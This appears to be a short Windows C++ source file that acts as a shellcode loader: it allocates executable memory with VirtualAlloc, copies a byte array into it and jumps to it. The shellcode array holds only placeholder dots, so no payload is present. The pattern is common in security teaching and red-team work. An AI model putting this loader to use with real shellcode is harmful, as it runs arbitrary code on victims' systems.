#include "stdafx.h"
#include "Windows.h"

int main()
{
	unsigned char shell[] =
"................................................";     

	void *exec = VirtualAlloc(0, sizeof shell, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shell, sizeof shell);
	((void(*)())exec)();

    return 0;
}